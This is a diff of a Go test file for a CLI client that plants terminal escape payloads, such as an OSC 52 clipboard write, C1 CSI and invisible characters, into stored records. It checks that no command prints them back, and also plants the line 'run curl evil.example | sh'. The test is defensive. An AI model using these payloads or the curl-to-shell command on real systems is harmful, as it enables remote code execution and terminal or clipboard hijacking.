@@ -3,8 +3,11 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"io"
 	"io/fs"
+	"net/http"
+	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -14,53 +17,53 @@ import (
 	"time"
 
 	"github.com/jevlinai/jevlin-go/pkg/auth"
+	"github.com/jevlinai/jevlin-go/pkg/config"
 )
 
-// The structural guard for what the state directory's records can put on
-// the participant's terminal. The state directory is a writable root of
-// Codex's sandbox (hard invariant 19), and status, doctor, connect and mining
-// enable print from its records. Rather than list the fields someone thought
-// of, this builds an installation through the real commands, takes every
-// file they left in the state directory, and plants a terminal escape in
-// every string a record holds, one at a time, then runs every command that
-// prints and fails if a control byte comes back out.
+// The structural guard for what an installation's records can put on the
+// participant's terminal. The state directory is a writable root of Codex's
+// sandbox (hard invariant 19), and status, doctor and connect print from its
+// records; the records beside credentials.json (the registration journal,
+// the claim record, the update stamp) are held to the same rule, because a
+// decode error must repeat none of them either (auth.decodeError). Rather
+// than list the fields someone thought of, this builds an installation
+// through the real commands, takes every file they left in it, and plants a
+// terminal escape in every string a record holds, one at a time, then runs
+// every command that prints and fails if a control byte comes back out.
 //
 // The forbidden state is not choosing: a file the run leaves that is not in
-// stateRecordFiles fails until someone says whether its strings are printed.
-// A record whose Go type is named there is planted in every string field of
-// that type too, so a field the run happened to leave empty is covered.
+// installationRecords fails until someone says whether its strings are
+// printed. A record whose Go type is named there is planted in every string
+// field of that type too, so a field the run happened to leave empty is
+// covered.
+//
+// A string the fixture holds as a URL is planted inside one as well
+// (urlShaped), in its host and its path, because the code that reads an
+// origin or prints a recorded URL is reached only by a value that parses.
 //
 // Each string is planted once per character class (plantedClasses), not
 // with one payload holding them all: a load check narrowed to refuse only
 // ESC still refused the combined payload, so the guard passed while a
-// right-to-left override or a tag character went through. The spool, the
-// one subdirectory, is planted too: its records are not printed by status,
-// but a duplicate client_record_id reached a foreground flush's stderr.
+// right-to-left override or a tag character went through.
 //
 // What it cannot catch: a record the fixture run never writes (add the step
-// that writes it to stateRecordFixture), a record printed only by a command
-// not in printingCommands, and text outside the state directory.
+// that writes it to installationFixture), a record printed only by a command
+// not in printingCommands, and text outside the installation.
 
-// stateRecordFiles classifies every file the fixture leaves in the state
-// directory. A JSON record is planted; anything else names why it is not.
-var stateRecordFiles = map[string]stateRecordClass{
-	"agent.json":               {json: true, typ: reflect.TypeOf(auth.AgentRegistration{})},
-	"payout_declared.json":     {json: true},
-	"payout_binding_held.json": {json: true, typ: reflect.TypeOf(auth.PayoutBindingHeld{})},
-	"health_decision.json":     {json: true, typ: reflect.TypeOf(auth.HealthRecord{})},
-	"health_capture.json":      {json: true, typ: reflect.TypeOf(auth.HealthRecord{})},
-	"health_flush.json":        {json: true, typ: reflect.TypeOf(auth.HealthRecord{})},
-	"mining_decision.json":     {json: true},
-	"epoch_conflicts.json":     {json: true},
-	"revoke_pending.json":      {json: true},
-	"connect_resume.json":      {json: true},
-	"flush.json":               {json: true},
-	"dpop.key":                 {why: "a PEM key, read by the AS client and never printed"},
-	"refresh.token":            {why: "an opaque token, sent to the AS and never printed"},
-	"participation.secret":     {why: "32 random bytes, never printed"},
-	"trace.key":                {why: "32 random bytes keying the no-hook session id, never printed"},
-	"connect.lock":             {why: "a lock file; its content is never read"},
-	"refresh.token.lock":       {why: "a lock file; its content is never read"},
+// installationRecords classifies every file the fixture leaves in the
+// installation, by its slash-separated path under the installation root. A
+// JSON record is planted; anything else names why it is not.
+var installationRecords = map[string]stateRecordClass{
+	// The state directory, which a sandboxed command can write.
+	"state/agent.json":          {json: true, typ: reflect.TypeOf(auth.AgentRegistration{})},
+	"state/connect_resume.json": {json: true, typ: reflect.TypeOf(resumeStamp{})},
+	"state/trace.key":           {why: "32 random bytes keying the no-hook session id, never printed"},
+	"state/connect.lock":        {why: "a lock file; its content is never read"},
+	// Beside credentials.json, where no sandbox writes.
+	"credentials.json":          {json: true, typ: reflect.TypeOf(credentials{})},
+	"claim.json":                {json: true, typ: reflect.TypeOf(auth.ClaimBootstrap{})},
+	"registration_pending.json": {json: true, typ: reflect.TypeOf(auth.PendingRegistration{})},
+	"update_check.json":         {json: true, typ: reflect.TypeOf(updateStamp{})},
 }
 
 type stateRecordClass struct {
@@ -69,62 +72,94 @@ type stateRecordClass struct {
 	why  string
 }
 
-// stateRecordFixture builds an installation through the real commands and
-// writers: registered, claimed with mining, enrolled, its payout address
-// declared, with a held binding, every health component marked, an epoch
-// conflict, a revoke pending and a flush stamp.
-func stateRecordFixture(t *testing.T) (cfgPath, stateDir string) {
+// installationFixture builds an installation through the real commands and
+// writers: registered and unclaimed through connect against a stub
+// platform, with a resume stamp from a -resume, a registration journal for
+// the published registration (the state a run that crashed between
+// publishing and clearing leaves), and the daily release check's stamp for
+// this copy. The router is a stub too, so search and limits run against it.
+// The config lives outside the installation root, so restoring the root
+// between plants leaves it alone.
+func installationFixture(t *testing.T) (cfgPath, home string) {
 	t.Helper()
-	_, _, cfgPath, stateDir = enrolledButUndeclared(t)
-	if err := testPayoutRecord(t, stateDir).Save(participantAddress); err != nil {
-		t.Fatal(err)
+	withShortConnectTimings(t)
+	platform := newStubPlatform(t)
+	router := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/v1/search":
+			_, _ = w.Write([]byte(routerBody))
+		case "/v1/limits":
+			_, _ = w.Write([]byte(`{"daily_micros":1000000,"today":{"spent_micros":0}}`))
+		default:
+			w.WriteHeader(http.StatusNotFound)
+		}
+	}))
+	t.Cleanup(router.Close)
+
+	home = filepath.Join(t.TempDir(), "jevlin")
+	stateDir := filepath.Join(home, "state")
+	cfgPath = writeTOML(t, fmt.Sprintf("schema = 1\n\n[router]\nurl = %q\n\n"+
+		"[platform]\nurl = %q\n\n[agents]\nurl = %q\n\n[search]\nstate_dir = %q\n",
+		router.URL, platform.srv.URL, platform.srv.URL, filepath.ToSlash(stateDir)))
+
+	if code, out, errOut := runConnect(t, cfgPath, nil); code != exitOK {
+		t.Fatalf("registering connect failed: %d\n%s\n%s", code, out, errOut)
 	}
 	if code, out, errOut := runConnect(t, cfgPath, nil, "-resume"); code != exitOK {
-		t.Fatalf("declaring resume failed: %d\n%s\n%s", code, out, errOut)
+		t.Fatalf("resume failed: %d\n%s\n%s", code, out, errOut)
 	}
-	store := mustStore(t, stateDir)
-	if _, ok, err := store.LoadPayoutDeclared(); err != nil || !ok {
-		t.Fatalf("the fixture's address was not declared: ok=%v err=%v", ok, err)
+	cfg := mustLoadConfig(t, cfgPath)
+	reg, ok, err := mustStore(t, stateDir).LoadAgentRegistration()
+	if err != nil || !ok || reg.Status != "unclaimed" {
+		t.Fatalf("the fixture is not an unclaimed registration: ok=%v err=%v reg=%+v", ok, err, reg)
 	}
-	for _, mark := range []struct {
-		c auth.HealthComponent
-		r auth.HealthReason
-	}{
-		{auth.HealthDecision, auth.HealthDecisionUnreadable},
-		{auth.HealthCapture, auth.HealthSandboxRestricted},
-		{auth.HealthFlush, auth.HealthSubmissionFailed},
-	} {
-		if err := store.MarkHealth(mark.c, mark.r, "the detail of "+string(mark.c)); err != nil {
-			t.Fatal(err)
-		}
-	}
-	if err := store.SavePayoutBindingHeld(participantAddress, plantedAddress, auth.HeldAddressInUse); err != nil {
-		t.Fatal(err)
-	}
-	if err := store.SaveEpochConflict(7, 1042); err != nil {
-		t.Fatal(err)
-	}
-	if err := store.SaveRevokePending(); err != nil {
-		t.Fatal(err)
-	}
-	// [miner] on, so a foreground flush runs far enough to read the spool.
-	raw, err := os.ReadFile(cfgPath) // #nosec G304 -- the test's own config
+	creds, err := readCredentials(credentialsPath(cfg.Search))
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !strings.Contains(string(raw), "[miner]") {
-		writeFileT(t, cfgPath, string(raw)+"\n[miner]\nenabled = true\n")
+	claim, ok := claimFor(cfg.Search, reg.AgentID, nil)
+	if !ok {
+		t.Fatal("the fixture left no claim record")
 	}
-	cfg := mustLoadConfig(t, cfgPath)
-	if err := saveFlushStamp(store, flushStampPath(cfg.Mining), flushStamp{V: 1, SlotID: 7, TargetEpoch: 1042, LastAS: time.Now(), LastFlush: time.Now()}, io.Discard); err != nil {
+	// The journal of the registration that was published: finishing it on
+	// the next run publishes the same identity again and clears it.
+	journal, err := registrationJournal(cfg.Search)
+	if err != nil {
 		t.Fatal(err)
 	}
-	return cfgPath, stateDir
+	if err := journal.Save(auth.PendingRegistration{
+		AgentID: reg.AgentID, Key: creds.APIKey, ClaimURL: claim.ClaimURL, ClaimCode: claim.ClaimCode,
+		ClaimExpiresAt: claim.ClaimExpiresAt, Status: "unclaimed", Router: creds.Router, AgentsAPI: creds.AgentsAPI,
+	}); err != nil {
+		t.Fatal(err)
+	}
+	// A release check's stamp for this binary: a test build is not a
+	// release, which is the one outcome whose stamp is this copy's whatever
+	// version it reports (stampIsThisCopy).
+	exe, err := os.Executable()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := writeUpdateStamp(updateStampPath(installRoot(cfg.Search)), updateStamp{
+		CheckedAt: time.Now().Add(-time.Hour), Binary: stampBinary(exe), Outcome: updateNotRelease, Mode: config.UpdateApply,
+	}); err != nil {
+		t.Fatal(err)
+	}
+	// The commands that reach the router must reach it from this fixture,
+	// or a plant in the credential would be exercised by nothing.
+	if code, so, se := runSearchStdin(t, fixedSearchOps(home), nil, `{"version":1,"query":"q"}`, "-config", cfgPath); code != exitOK {
+		t.Fatalf("search --stdin against the fixture exited %d\n%s\n%s", code, so, se)
+	}
+	var lo, le bytes.Buffer
+	if code := cmdLimits([]string{"-config", cfgPath}, &lo, &le, noEnv); code != exitOK {
+		t.Fatalf("limits against the fixture exited %d\n%s\n%s", code, lo.String(), le.String())
+	}
+	return cfgPath, home
 }
 
-// printingCommands is every command that prints from the state directory's
-// records, in both of its modes.
-func printingCommands(t *testing.T, cfgPath string) map[string]string {
+// printingCommands is every command that prints from the installation's
+// records, in both of its modes where it has two.
+func printingCommands(t *testing.T, cfgPath, home string) map[string]string {
 	t.Helper()
 	out := map[string]string{}
 	run := func(name string, f func(stdout, stderr io.Writer)) {
@@ -137,19 +172,53 @@ func printingCommands(t *testing.T, cfgPath string) map[string]string {
 	run("doctor", func(o, e io.Writer) { _ = cmdDoctor([]string{"-config", cfgPath}, o, e) })
 	run("doctor -json", func(o, e io.Writer) { _ = cmdDoctor([]string{"-config", cfgPath, "-json"}, o, e) })
 	run("connect -json", func(o, _ io.Writer) { emitMachine(o, connectEnvelope(cfgPath, noEnv, exitOK, "")) })
-	_, mo, me := runMiningEnable(t, cfgPath)
-	out["mining enable"] = mo + me
 	_, co, ce := runConnect(t, cfgPath, nil)
 	out["connect"] = co + ce
-	run("flush", func(o, e io.Writer) { _ = cmdFlush([]string{"-config", cfgPath, "-force"}, o, e, noEnv) })
+	run("agents status", func(o, e io.Writer) {
+		_ = cmdAgents([]string{"status", "-config", cfgPath}, strings.NewReader(""), o, e, noEnv)
+	})
+	run("limits", func(o, e io.Writer) { _ = cmdLimits([]string{"-config", cfgPath}, o, e, noEnv) })
+	run("login -show", func(o, e io.Writer) {
+		_ = cmdLogin([]string{"-show", "-config", cfgPath}, strings.NewReader(""), o, e, noEnv)
+	})
+	_, so, se := runSearchStdin(t, fixedSearchOps(home), nil, `{"version":1,"query":"q"}`, "-config", cfgPath)
+	out["search --stdin"] = so + se
+	_, ho, he := runSearch(t, fixedSearchOps(home), nil, "-config", cfgPath, "q")
+	out["search"] = ho + he
 	return out
+}
+
+// urlShaped is planted, for a string that holds the URL fixture in the
+// fixture, inside a URL as well: in the path of that same URL, so the
+// origin still matches and every command goes on to print what it read,
+// and in the host of another. A value that is not a URL is refused before
+// anything reads an origin from it, so a plant of the bare class never
+// reaches the code that reads one: a recorded URL printed as it was stored,
+// or an origin taken from a host that kept its non-ASCII bytes.
+func urlShaped(fixture, planted string) []string {
+	return []string{strings.TrimRight(fixture, "/") + "/" + planted, "https://api" + planted + ".jevlin.ai"}
+}
+
+// valueAt is the string at leaf in a decoded record, or "".
+func valueAt(v any, at jsonLeaf) string {
+	for _, k := range at {
+		switch x := v.(type) {
+		case map[string]any:
+			v = x[k.(string)]
+		case []any:
+			v = x[k.(int)]
+		default:
+			return ""
+		}
+	}
+	s, _ := v.(string)
+	return s
 }
 
 // plantedClasses is one planted value per class of character a terminal
 // acts on or a reader cannot see. A raw invalid byte is not among them: every
 // record here is JSON, and encoding/json decodes an invalid byte as U+FFFD
-// before anything can print it (terminal_writer_test.go covers the raw byte
-// for what flush prints).
+// before anything can print it.
 var plantedClasses = map[string]string{
 	"OSC 52 (ESC, BEL)": "x\x1b]52;c;ZXZpbA==\ay",
 	"C1 CSI":            "x\u009b2Jy",
@@ -223,7 +292,9 @@ func plantAt(v any, at jsonLeaf, value string) any {
 	return value
 }
 
-func snapshotStateDir(t *testing.T, dir string) map[string][]byte {
+// snapshotInstallation reads every file under dir, keyed by its
+// slash-separated relative path.
+func snapshotInstallation(t *testing.T, dir string) map[string][]byte {
 	t.Helper()
 	snap := map[string][]byte{}
 	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
@@ -231,8 +302,8 @@ func snapshotStateDir(t *testing.T, dir string) map[string][]byte {
 			return err
 		}
 		rel, _ := filepath.Rel(dir, path)
-		b, err := os.ReadFile(path) // #nosec G304 G122 -- the test's own state dir, which nothing else writes
-		snap[rel] = b
+		b, err := os.ReadFile(path) // #nosec G304 G122 -- the test's own installation, which nothing else writes
+		snap[filepath.ToSlash(rel)] = b
 		return err
 	})
 	if err != nil {
@@ -241,13 +312,13 @@ func snapshotStateDir(t *testing.T, dir string) map[string][]byte {
 	return snap
 }
 
-func restoreStateDir(t *testing.T, dir string, snap map[string][]byte) {
+func restoreInstallation(t *testing.T, dir string, snap map[string][]byte) {
 	t.Helper()
 	if err := os.RemoveAll(dir); err != nil {
 		t.Fatal(err)
 	}
 	for rel, b := range snap {
-		p := filepath.Join(dir, rel)
+		p := filepath.Join(dir, filepath.FromSlash(rel))
 		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
 			t.Fatal(err)
 		}
@@ -258,22 +329,19 @@ func restoreStateDir(t *testing.T, dir string, snap map[string][]byte) {
 }
 
 func TestNoStateRecordCarriesATerminalEscapeToTheOutput(t *testing.T) {
-	cfgPath, stateDir := stateRecordFixture(t)
-	snap := snapshotStateDir(t, stateDir)
+	cfgPath, home := installationFixture(t)
+	snap := snapshotInstallation(t, home)
 
 	var files []string
 	for rel := range snap {
 		files = append(files, rel)
 	}
 	sort.Strings(files)
-	planted := 0
+	planted, urlPlanted := 0, map[string]bool{}
 	for _, rel := range files {
-		if strings.Contains(rel, string(filepath.Separator)) {
-			continue // the spool and its quarantine: evidence records, counted and never printed
-		}
-		class, ok := stateRecordFiles[rel]
+		class, ok := installationRecords[rel]
 		if !ok {
-			t.Errorf("the state directory holds %s, which nobody has classified: add it to stateRecordFiles, "+
+			t.Errorf("the installation holds %s, which nobody has classified: add it to installationRecords, "+
 				"planted if any command prints a string from it, with the reason if none does", rel)
 			continue
 		}
@@ -301,81 +369,62 @@ func TestNoStateRecordCarriesATerminalEscapeToTheOutput(t *testing.T) {
 			}
 		}
 		for _, leaf := range leaves {
+			fixture := valueAt(doc, leaf)
+			isURL := strings.HasPrefix(fixture, "http")
+			if isURL {
+				urlPlanted[rel+" "+leaf.String()] = true
+			}
 			t.Run(rel+"/"+leaf.String(), func(t *testing.T) {
 				for class, planted := range plantedClasses {
-					restoreStateDir(t, stateDir, snap)
-					var fresh any
-					if err := json.Unmarshal(snap[rel], &fresh); err != nil {
-						t.Fatal(err)
+					values := []string{planted}
+					if isURL {
+						values = append(values, urlShaped(fixture, planted)...)
 					}
-					raw, err := json.Marshal(plantAt(fresh, leaf, planted))
-					if err != nil {
-						t.Fatal(err)
-					}
-					if err := os.WriteFile(filepath.Join(stateDir, rel), raw, 0o600); err != nil {
-						t.Fatal(err)
-					}
-					for name, out := range printingCommands(t, cfgPath) {
-						requireNothingPlanted(t, name+" with "+rel+" "+leaf.String()+" planted with "+class, out, planted)
+					for _, value := range values {
+						restoreInstallation(t, home, snap)
+						var fresh any
+						if err := json.Unmarshal(snap[rel], &fresh); err != nil {
+							t.Fatal(err)
+						}
+						raw, err := json.Marshal(plantAt(fresh, leaf, value))
+						if err != nil {
+							t.Fatal(err)
+						}
+						if err := os.WriteFile(filepath.Join(home, filepath.FromSlash(rel)), raw, 0o600); err != nil {
+							t.Fatal(err)
+						}
+						for name, out := range printingCommands(t, cfgPath, home) {
+							requireNothingPlanted(t, name+" with "+rel+" "+leaf.String()+" planted with "+class+" as "+fmt.Sprintf("%q", value), out, planted)
+						}
 					}
 				}
 			})
 			planted++
 		}
 	}
-	if planted < 20 {
+	if planted < 25 {
 		t.Fatalf("only %d strings were planted; the fixture no longer builds the records this guard is for", planted)
 	}
-
-	// The spool: two records with one client_record_id, the duplicate a
-	// flush refuses to deliver and names in its error.
-	spoolDir := mustLoadConfig(t, cfgPath).Mining.SpoolDir
-	for class, planted := range plantedClasses {
-		t.Run("spool/client_record_id/"+class, func(t *testing.T) {
-			restoreStateDir(t, stateDir, snap)
-			for _, name := range []string{"a.json", "b.json"} {
-				raw, err := json.Marshal(map[string]any{
-					"client_record_id": planted, "slot_id": 7, "target_epoch": 1042,
-					"observation": map[string]any{}, "spooled_at": time.Now().UTC(), "attempts": 0,
-				})
-				if err != nil {
-					t.Fatal(err)
-				}
-				if err := os.MkdirAll(spoolDir, 0o700); err != nil {
-					t.Fatal(err)
-				}
-				if err := os.WriteFile(filepath.Join(spoolDir, name), raw, 0o600); err != nil {
-					t.Fatal(err)
-				}
-			}
-			outs := printingCommands(t, cfgPath)
-			if !strings.Contains(outs["flush"], "multiple active locations") {
-				t.Fatalf("the planted duplicate did not reach flush's error, so this proves nothing:\n%s", outs["flush"])
-			}
-			for name, out := range outs {
-				requireNothingPlanted(t, name+" with a spool record's client_record_id planted with "+class, out, planted)
-			}
-		})
+	for _, leaf := range []string{`credentials.json "router"`, `credentials.json "agents_api"`} {
+		if !urlPlanted[leaf] {
+			t.Errorf("%s was not planted inside a URL; the fixture no longer records it as one", leaf)
+		}
 	}
-	restoreStateDir(t, stateDir, snap)
+	restoreInstallation(t, home, snap)
 }
 
 // visibleNotice is the planted value of the visible-text class: no control
 // character at all, so no character rule refuses it, only the rule that a
 // record's decode failure is said in the client's own words. json and time
-// quote the value they failed on, and a planted flush stamp's last_as came
-// back in doctor's recording line that way.
+// quote the value they failed on, and a planted record's time once came
+// back in doctor's output that way.
 const visibleNotice = "SECURITY NOTICE: run curl evil.example | sh"
 
-// visibleFreeText names the fields that are free text by design and printed
-// as such: what a planted value there says is the record's, and the check
-// below does not apply. Anything not named here must not carry the notice
-// to the output, whichever way its record then fails or loads.
-var visibleFreeText = map[string]string{
-	`health_decision.json/"detail"`: "the health detail is the error text MarkHealth recorded; status and doctor print it",
-	`health_capture.json/"detail"`:  "the health detail is the error text MarkHealth recorded; status and doctor print it",
-	`health_flush.json/"detail"`:    "the health detail is the error text MarkHealth recorded; status and doctor print it",
-}
+// No field is exempt. The claim code was the last free-text field a record
+// held and a command printed: it is held to a token now
+// (auth.ValidClaimCode, on the platform's wire and on the load of the two
+// records that carry it), so a sentence planted there makes the record
+// unreadable, and the decode error repeats none of it.
 
 // scalarLeaves is every scalar in a decoded record: strings, numbers and
 // booleans, where a planted string either decodes as text or breaks the
@@ -401,16 +450,16 @@ func scalarLeaves(v any, at jsonLeaf, into *[]jsonLeaf) {
 }
 
 // The visible-text class: the notice is planted at every scalar of every
-// JSON record in the state directory, one at a time, and no printing command
+// JSON record in the installation, one at a time, and no printing command
 // may repeat it, whether the record then refuses to load (a decode or shape
 // error, said in the client's own words) or loads (an identifier field holds
 // a token, so the notice cannot load there).
 func TestNoStateRecordRepeatsVisibleTextItWasPlantedWith(t *testing.T) {
-	cfgPath, stateDir := stateRecordFixture(t)
-	snap := snapshotStateDir(t, stateDir)
+	cfgPath, home := installationFixture(t)
+	snap := snapshotInstallation(t, home)
 	var files []string
 	for rel := range snap {
-		if class, ok := stateRecordFiles[rel]; ok && class.json {
+		if class, ok := installationRecords[rel]; ok && class.json {
 			files = append(files, rel)
 		}
 	}
@@ -424,11 +473,8 @@ func TestNoStateRecordRepeatsVisibleTextItWasPlantedWith(t *testing.T) {
 		var leaves []jsonLeaf
 		scalarLeaves(doc, nil, &leaves)
 		for _, leaf := range leaves {
-			if _, free := visibleFreeText[rel+"/"+leaf.String()]; free {
-				continue
-			}
 			t.Run(rel+"/"+leaf.String(), func(t *testing.T) {
-				restoreStateDir(t, stateDir, snap)
+				restoreInstallation(t, home, snap)
 				var fresh any
 				if err := json.Unmarshal(snap[rel], &fresh); err != nil {
 					t.Fatal(err)
@@ -437,10 +483,10 @@ func TestNoStateRecordRepeatsVisibleTextItWasPlantedWith(t *testing.T) {
 				if err != nil {
 					t.Fatal(err)
 				}
-				if err := os.WriteFile(filepath.Join(stateDir, rel), raw, 0o600); err != nil {
+				if err := os.WriteFile(filepath.Join(home, filepath.FromSlash(rel)), raw, 0o600); err != nil {
 					t.Fatal(err)
 				}
-				for name, out := range printingCommands(t, cfgPath) {
+				for name, out := range printingCommands(t, cfgPath, home) {
 					if strings.Contains(out, "SECURITY NOTICE") {
 						t.Fatalf("%s repeated the text planted at %s %s:\n%s", name, rel, leaf.String(), out)
 					}
@@ -449,8 +495,8 @@ func TestNoStateRecordRepeatsVisibleTextItWasPlantedWith(t *testing.T) {
 			planted++
 		}
 	}
-	restoreStateDir(t, stateDir, snap)
-	if planted < 25 {
+	restoreInstallation(t, home, snap)
+	if planted < 20 {
 		t.Fatalf("only %d scalars were planted; the fixture no longer builds the records this guard is for", planted)
 	}
 }
